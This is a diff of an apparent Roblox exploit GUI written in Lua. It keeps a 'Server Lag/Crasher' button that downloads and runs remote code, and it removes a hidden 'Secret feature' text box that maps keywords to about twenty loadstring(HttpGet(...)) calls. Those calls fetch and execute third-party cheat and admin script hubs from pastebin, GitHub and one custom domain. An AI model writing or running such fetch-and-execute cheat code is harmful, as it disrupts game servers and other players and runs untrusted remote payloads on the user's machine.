@@ -2566,54 +2566,7 @@ end)
  
 Section:NewButton("Server Lag/Crasher 3", "Server Lag/Crash 3", function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/d44df016fe28bc8d5974/things/main/robloxianwaterpark'))()
-end)
-
-local Section = Tab:NewSection("Secret feature!")
-
-Section:NewTextBox("TextboxText", "TextboxInfo", function(val)
-	I = val
-end)
-
-Section:NewButton("Server Lag/Crasher 3", "Server Lag/Crash 3", function()
-if I == "Ultra" then loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Ultra-Hub/main/Main"))() end
-
-if I == "Shaltix" then loadstring(game:HttpGet("https://pastebin.com/raw/ZawvTPru", true))() end
-
-if I == "Eclipse" then loadstring(game:HttpGet("https://pastebin.com/raw/JP9hmvpm", true))() end
-
-if I == "RemX" then loadstring(game:HttpGet(("https://raw.githubusercontent.com/Henry887/RemX-Script-Hub/main/main.lua"), true))() end
-
-if I == "Mukuro" then loadstring(game:HttpGet("https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua", true))() end
-
-if I == "NukeVsCity" then loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader", true))() end
-
-if I == "Nullware" then loadstring(game:HttpGet("https://pastebin.com/raw/qU9sj0iT"))() end
-
-if I == "Universal" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script"))() end
-
-if I == "Dark" then loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))() end
-
-if I == "iV" then loadstring(game:HttpGet("https://raw.githubusercontent.com/OmnipotenceDeveloper/Number/main/1.lua", true))() end
-
-if I == "IY FE" then loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))() end
-
-if I == "CMD X" then loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))() end
-
-if I == "Fate" then loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua", true))() end
-
-if I == "DomainX" then loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))() end
-
-if I == "Unfair" then loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))() end
-
-if I == "Rogue" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/Main.lua", true))() end
-
-if I == "Plasek" then loadstring(game:HttpGet("https://pastebin.com/raw/QQn2E740", true))() end
-
-if I == "Galaxy" then loadstring(game:HttpGet('http://galaxy-hub.gay/whitelist'))() end
-
-if I == "Unnamed" then loadstring(game:HttpGet('https://raw.githubusercontent.com/Dumb-Utility/UnnamedHub/main/UH.lua'))() end
-
-if I == "Dizzy" then loadstring(game:HttpGet(("https://raw.githubusercontent.com/dizyhvh/rbx_scripts/main/dizzy_hub/loader.lua")))() end) 
+end) 
 
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "ScreenGui"
